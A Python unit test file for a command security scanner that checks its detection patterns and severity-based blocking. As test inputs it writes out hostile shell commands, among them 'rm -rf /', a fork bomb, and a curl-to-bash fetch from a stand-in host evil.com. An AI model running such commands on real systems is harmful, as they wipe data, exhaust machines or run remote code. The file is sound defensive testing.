"""Tests for the security scanner."""

from unittest.mock import MagicMock
from vpm.scanner import SecurityScanner, SecurityFinding, Severity
from vpm.config import Config


def make_scanner(level="warn", check_urls=False):
    config = MagicMock(spec=Config)
    config.load_config.return_value = {
        "security": {"level": level, "check_urls": check_urls}
    }
    return SecurityScanner(config)


def make_app(name, steps):
    class FakeApp:
        def __init__(self, n, s):
            self.name = n
            self.steps = s
    return FakeApp(name, steps)


class TestPatternDetection:
    def test_detect_rm_rf_root(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Danger", "command": "rm -rf /"}])
        findings = scanner.scan_apps([app])
        critical = [f for f in findings if f.severity == Severity.CRITICAL.value]
        assert len(critical) >= 1
        assert any("system-wipe" in f.pattern_name for f in critical)

    def test_detect_pipe_to_shell(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Install", "command": "curl http://evil.com/script | bash"}])
        findings = scanner.scan_apps([app])
        high = [f for f in findings if f.severity == Severity.HIGH.value]
        assert any("pipe-to-shell" in f.pattern_name for f in high)

    def test_detect_chmod_777(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Perms", "command": "chmod 777 /var/www"}])
        findings = scanner.scan_apps([app])
        high = [f for f in findings if f.pattern_name == "chmod-777"]
        assert len(high) >= 1

    def test_detect_eval_variable(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Eval", "command": 'eval "$USER_INPUT"'}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "eval-variable" for f in findings)

    def test_safe_command_no_critical(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Safe", "command": "sudo apt-get install -y nginx"}])
        findings = scanner.scan_apps([app])
        critical = [f for f in findings if f.severity == Severity.CRITICAL.value]
        assert len(critical) == 0

    def test_detect_fork_bomb(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "Bomb", "command": ":(){ :|:& };:"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "fork-bomb" for f in findings)

    def test_detect_insecure_flag(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "curl --insecure https://example.com"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "insecure-download" for f in findings)


class TestURLAnalysis:
    def test_detect_url_shortener(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "curl https://bit.ly/abc123"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "url-shortener" for f in findings)

    def test_detect_suspicious_tld(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "curl https://malware.xyz/payload"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "suspicious-tld" for f in findings)

    def test_detect_http_non_https(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "wget http://example.com/file"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "non-https" for f in findings)

    def test_allowed_domain_skipped(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "curl https://github.com/repo/file"}])
        findings = scanner.scan_apps([app])
        url_findings = [f for f in findings if f.pattern_name in ("suspicious-tld", "url-shortener", "non-https", "ip-only-url")]
        assert len(url_findings) == 0

    def test_detect_ip_only_url(self):
        scanner = make_scanner()
        app = make_app("test", [{"label": "DL", "command": "curl http://192.168.1.1/payload"}])
        findings = scanner.scan_apps([app])
        assert any(f.pattern_name == "ip-only-url" for f in findings)


class TestSeverityLevels:
    def test_should_block_critical(self):
        scanner = make_scanner(level="warn")
        findings = [SecurityFinding(
            severity=Severity.CRITICAL.value, app_name="t", step_index=0,
            step_label="t", pattern_name="t", description="t", matched_text="t",
        )]
        assert scanner.should_block(findings) is True

    def test_should_not_block_high_in_warn_mode(self):
        scanner = make_scanner(level="warn")
        findings = [SecurityFinding(
            severity=Severity.HIGH.value, app_name="t", step_index=0,
            step_label="t", pattern_name="t", description="t", matched_text="t",
        )]
        assert scanner.should_block(findings) is False

    def test_should_block_high_in_strict_mode(self):
        scanner = make_scanner(level="strict")
        findings = [SecurityFinding(
            severity=Severity.HIGH.value, app_name="t", step_index=0,
            step_label="t", pattern_name="t", description="t", matched_text="t",
        )]
        assert scanner.should_block(findings) is True

    def test_off_blocks_nothing(self):
        scanner = make_scanner(level="off")
        findings = [SecurityFinding(
            severity=Severity.CRITICAL.value, app_name="t", step_index=0,
            step_label="t", pattern_name="t", description="t", matched_text="t",
        )]
        assert scanner.should_block(findings) is False

    def test_permissive_filters_medium(self):
        scanner = make_scanner(level="permissive")
        findings = [SecurityFinding(
            severity=Severity.MEDIUM.value, app_name="t", step_index=0,
            step_label="t", pattern_name="t", description="t", matched_text="t",
        )]
        assert len(scanner.filter_display(findings)) == 0
